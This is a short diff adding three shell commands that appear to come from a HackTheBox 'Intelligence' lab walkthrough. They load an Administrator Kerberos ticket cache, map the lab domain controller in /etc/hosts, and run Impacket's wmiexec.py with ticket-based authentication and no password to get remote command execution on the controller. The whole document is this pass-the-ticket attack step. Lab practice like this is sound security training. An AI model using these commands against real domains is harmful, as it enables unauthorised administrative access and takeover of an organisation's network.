@@ -1,0 +1,3 @@
+export KRB5CCNAME=Administrator.ccache
+echo "10.10.10.248 dc.intelligence.htb" | sudo tee -a /etc/hosts
+wmiexec.py -k -no-pass dc.intelligence.htb
